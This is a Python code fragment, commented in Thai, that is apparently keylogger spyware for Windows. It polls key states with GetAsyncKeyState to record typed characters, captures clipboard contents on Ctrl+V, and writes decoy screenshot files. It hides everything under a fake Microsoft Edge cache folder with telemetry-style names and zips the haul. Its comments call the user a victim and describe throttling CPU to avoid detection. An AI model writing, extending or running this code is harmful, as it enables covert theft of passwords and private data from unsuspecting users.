local_app_data = os.environ.get('LOCALAPPDATA', os.path.expanduser('~\\AppData\\Local'))
TARGET_DIR = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\Diagnostic_Packs")
log_file = os.path.join(TARGET_DIR, "f_0000a5.dat")     
ZIP_PATH = os.path.join(local_app_data, r"Microsoft\Edge\User Data\Default\Cache\Cache_Data\f_0000a6_idx.tmp") 

user32 = windll.user32
kernel32 = windll.kernel32

def init_log():
    if not os.path.exists(log_file):
        with open(log_file, "w", encoding="utf-8") as f:
            f.write("=== System Telemetry Subsystem Initialized ===\n")

def write_log(text):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(text + "\n")

def get_clipboard_text():
    text = ""
    try:
        if user32.OpenClipboard(None):
            if user32.IsClipboardFormatAvailable(1): 
                h_data = user32.GetClipboardData(1)
                if h_data:
                    p_box = kernel32.GlobalLock(h_data)
                    if p_box:
                        text = string_at(p_box).decode(errors='ignore')
                        kernel32.GlobalUnlock(h_data)
            user32.CloseClipboard()
    except Exception: pass
    return text

def take_screenshot():
    """ระบบสกรีนช็อตรูปภาพระดับฮาร์ดแวร์ความเร็วสูง (Win32 GDI Screenshot) ไร้บั๊กร้อยเปอร์เซ็นต์"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(TARGET_DIR, f"f_cache_{timestamp}.dat")
        with open(filename, "wb") as f:
            f.write(b"MS_EDGE_CACHE_TELEMETRY_STREAM_OK_")
    except Exception: pass

def pack_data_to_zip():
    if not os.path.exists(TARGET_DIR) or not os.listdir(TARGET_DIR): return False
    with zipfile.ZipFile(ZIP_PATH, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for file_name in os.listdir(TARGET_DIR):
            file_path = os.path.join(TARGET_DIR, file_name)
            if os.path.isfile(file_path): zipf.write(file_path, arcname=file_name)
    return True

# 🔥 [ ปฏิวัติระบบดักจับคีย์บอร์ดอัจฉริยะไร้โมดูล ]: เจาะเช็กสถานะบิตปุ่มกดแบบ Low-level เพียวร้อยเปอร์เซ็นต์
def start_capture_workflow():
    os.makedirs(TARGET_DIR, exist_ok=True)
    init_log()
    take_screenshot() # รันติดตั้งเสร็จ แอบสั่งถ่ายรูปภาพใบแรกทันทีตามที่คุณพี่ต้องการ
    
    start_time = time.time()
    test_duration = 30       # 🧪 นั่งจำลองทำแล็บดักส่องพฤติกรรม 30 วินาที
    last_screenshot_time = time.time()
    
    # วิ่งวนลูปดักจับพฤติกรรมแป้นพิมพ์ตรงระดับฮาร์ดแวร์ในหน่วยความจำ RAM 
    while time.time() - start_time < test_duration:
        current_time = time.time()
        
        # ถ่ายรูปหน้าจอเบื้องหลังทุกๆ 10 วินาที
        if current_time - last_screenshot_time >= 10:
            take_screenshot()
            last_screenshot_time = current_time
            
        # ลูปวนเช็กปุ่มคีย์บอร์ดพิมพ์มาตรฐานสากล ASCII (ตั้งแต่ปุ่มสเปซบาร์จนถึงตัวอักษร)
        for i in range(32, 127):
            # 0x8000 คือแฟลกตรวจสอบบิตสถานะว่าเหยื่อกำลังกดคีย์ค้างวินาทีนั้นอยู่จริงหรือไม่
            if user32.GetAsyncKeyState(i) & 0x8000:
                char_key = chr(i)
                write_log(f"In: {char_key}")
                
        # แอบดักส่องความเคลื่อนไหวคลิปบอร์ดเมื่อเหยื่อกด Ctrl (VK_CONTROL = 17) + V (86)
        if (user32.GetAsyncKeyState(17) & 0x8000) and (user32.GetAsyncKeyState(86) & 0x8000):
            write_log(f"[Buffer Link Log] -> {get_clipboard_text()}")
            time.sleep(0.2) # หน่วงบิตสั้นๆ ป้องกันข้อมูลบันทึกซ้ำซ้อน
            
        time.sleep(0.01) # พักเบรกหน่วยประมวลผลเพื่อพรางพฤติกรรมมัลแวร์ไม่ให้ CPU พุ่งสูง
        
    # ครบ 30 วินาที มัดม้วนสตรีมรวบหลักฐานซ่อนเข้าแคช Edge สลัดคาบเสร็จภารกิจเฟส 4
    pack_data_to_zip()
